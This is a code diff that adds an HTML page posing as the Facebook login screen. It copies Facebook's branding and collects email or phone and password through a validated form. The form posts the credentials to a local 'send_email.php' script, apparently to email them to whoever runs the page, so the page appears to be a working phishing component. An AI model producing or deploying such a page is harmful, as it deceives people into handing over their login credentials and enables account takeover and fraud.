@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Facebook</title>
+    <link rel="stylesheet" href="styles.css">
+    <script>
+        function validateForm(event) {
+            const emailInput = document.querySelector('input[name="email"]');
+            const passwordInput = document.querySelector('input[name="password"]');
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!validateEmail(email) && !validatePhone(email)) {
+                alert("Please enter a valid email or phone number.");
+                emailInput.focus();
+                event.preventDefault();
+                return false;
+            }
+
+            if (password.length < 6) {
+                alert("Password must be at least 6 characters long.");
+                passwordInput.focus();
+                event.preventDefault();
+                return false;
+            }
+
+            return true; // Allow form submission if validation passes
+        }
+
+        function validateEmail(email) {
+            const emailPattern = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
+            return emailPattern.test(email);
+        }
+
+        function validatePhone(phone) {
+            const phonePattern = /^[0-9]{10,15}$/;
+            return phonePattern.test(phone);
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="right-section">
+            <div class="login-box">
+                <form action="send_email.php" method="POST" onsubmit="return validateForm(event)">
+                    <input type="text" name="email" placeholder="Email or Phone" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <button type="submit">Log In</button>
+                    <a href="#">Forgotten password?</a>
+                    <div class="divider"></div>
+                    <button type="button" class="create-account" onclick="alert('Redirecting to registration page')">Create New Account</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
